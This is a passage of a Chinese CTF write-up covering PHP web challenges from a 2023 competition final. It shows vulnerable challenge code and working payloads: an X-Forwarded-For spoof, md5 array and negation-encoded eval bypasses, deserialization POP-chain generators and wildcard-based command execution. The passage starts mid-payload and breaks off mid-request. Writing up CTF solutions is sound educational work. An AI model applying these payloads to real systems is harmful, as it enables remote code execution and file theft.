class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%A5%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%A7%AD%<span class="hljs-number">93</span>%B4%BC%AD%CC%<span class="hljs-number">9</span>E%BC%<span class="hljs-number">87</span>%<span class="hljs-number">85</span>%<span class="hljs-number">9</span>B%B7%B5%CD%A6%A8%<span class="hljs-number">88</span>%<span class="hljs-number">90</span>%B5%B7%A5%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%B7%A9%<span class="hljs-number">93</span>%B4%AC%CA%AE%AC%B9%BD%<span class="hljs-number">99</span>%AD%AA%C6%B2%B4%AB%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>E%AC%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>D%B0%<span class="hljs-number">88</span>%CF%B4%<span class="hljs-number">99</span>%AE%CF%B4%DD%DF%<span class="hljs-number">83</span>%DF%<span class="hljs-number">9</span>D%<span class="hljs-number">9</span>E%<span class="hljs-number">8</span>C%<span class="hljs-number">9</span>A%C9%CB%DF%D2%<span class="hljs-number">9</span>B%DF%C1%DF%D0%<span class="hljs-number">8</span>B%<span class="hljs-number">92</span>%<span class="hljs-number">8</span>F%D0%<span class="hljs-number">9</span>E%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%D6%DF%D9%D9%DF%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%DF%D0%<span class="hljs-number">8</span>B%<span class="hljs-number">92</span>%<span class="hljs-number">8</span>F%D0%<span class="hljs-number">9</span>E%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F);<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-web1-4.png"></p><h2 id="决赛-baby-md5"><a href="#决赛-baby-md5" class="headerlink" title="决赛[baby md5]"></a>决赛[baby md5]</h2><p>check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isRequestFromLocal</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// 定义本地IP地址</span><br>    <span class="hljs-variable">$localIP</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><br>    <span class="hljs-comment">// 获取客户端IP地址</span><br>    <span class="hljs-variable">$clientIP</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br><br>    <span class="hljs-comment">// 比较客户端IP地址与本地IP地址</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$clientIP</span> === <span class="hljs-variable">$localIP</span>) &#123;<br>        <span class="hljs-comment">// 请求来自本地</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 请求不来自本地</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;check.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">isRequestFromLocal</span>()) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello!&#x27;</span>;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/eval|shell_exec|system|proc_open|popen|pcntl_exec|\&#x27;|cat|include|whoami/i&quot;</span>,<span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$c</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Oh no, you are hacker!!!&#x27;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;failed&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ip验证用X-Forwarded-For，md5弱比较用数组绕过，正则匹配用取反绕过</p><p>payload：<code>X-Forwarded-For=127.0.0.1</code>,<code>cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);&amp;key1[]=1&amp;key2[]=2</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-js-web1-1.png"></p><h2 id="决赛-easy-serialize"><a href="#决赛-easy-serialize" class="headerlink" title="决赛[easy serialize]"></a>决赛[easy serialize]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in /flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">baby</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var3</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">learn</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-variable">$key</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAge</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;var2-&gt;var3;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">learn</span>(<span class="hljs-variable">$var</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">learn</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAge</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">young</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">old</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Okay, you get the key, but we send you &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;age&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;age&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>给定了flag位置，同时又有<code>file_get_contents</code>,那么就从learn函数入手。很明显<code>__invoke</code>调用了<code>learn</code>，传进去了可控的<code>$var</code>，而在<code>yong::__tostring</code>中可以触发<code>baby::__invoke</code>，<code>old::__get</code>中可以触发<code>yong::__tostring</code>，baby中的getAge又能触发<code>old::__get</code></p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">baby</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;/flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var3</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">learn</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-variable">$key</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAge</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;var2-&gt;var3;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">learn</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAge</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">young</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">old</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Okay, you get the key, but we send you &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">baby</span>();<br><span class="hljs-variable">$a</span>-&gt;var2 = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">old</span>();<br><span class="hljs-variable">$a</span>-&gt;var2-&gt;<span class="hljs-keyword">var</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">young</span>();<br><span class="hljs-variable">$a</span>-&gt;var2-&gt;<span class="hljs-keyword">var</span>-&gt;<span class="hljs-keyword">var</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">baby</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><h2 id="决赛-p2rce"><a href="#决赛-p2rce" class="headerlink" title="决赛[p2rce]"></a>决赛[p2rce]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a === <span class="hljs-variable language_">$this</span>-&gt;b) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;s-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;b) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_$]+/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;b)) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-variable">$flag</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;br/&gt;get it!!&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;goaway!!!&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>从<code>CCC::__destruct</code>进入，有个判断，用<code>&amp;</code>引用地址，使<code>$a</code>永远与<code>$b</code>相等，然后echo触发<code>AAA::__toString</code>，接着可以通过return对象中不存在的属性来触发<code>BBB::__get</code>，最后绕过正则实现rce</p><p>最后结尾还有一个<code>throw new Exception</code>，破坏字符串结构即可触发fast destruct</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = &amp;<span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a === <span class="hljs-variable language_">$this</span>-&gt;b) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;lewiserii&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;s-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;/???/?? /* .&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;b) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_$]+/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;b)) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-variable">$flag</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;br/&gt;get it!!&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CCC</span>();<br><span class="hljs-variable">$a</span>-&gt;c = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">AAA</span>();<br><span class="hljs-variable">$a</span>-&gt;c-&gt;s = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">BBB</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p><code>O%3A3%3A%22CCC%22%3A3%3A%7Bs%3A1%3A%22c%22%3BO%3A3%3A%22AAA%22%3A2%3A%7Bs%3A1%3A%22s%22%3BO%3A3%3A%22BBB%22%3A1%3A%7Bs%3A1%3A%22b%22%3Bs%3A12%3A%22%2F%3F%3F%3F%2F%3F%3F+%2F%2A+.%22%3B%7Ds%3A1%3A%22a%22%3Bs%3A9%3A%22lewiserii%22%3B%7Ds%3A1%3A%22a%22%3BN%3Bs%3A1%3A%22b%22%3BR%3A6%3B</code></p><p>通过通配符匹配&#x2F;bin&#x2F;cp，将根目录所有文件复制到根目录，然后访问获得flag</p><p>或者通过<code>. /???/????????[@-[]</code>匹配php的临时文件来rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /?ctf=O%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>CCC%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span 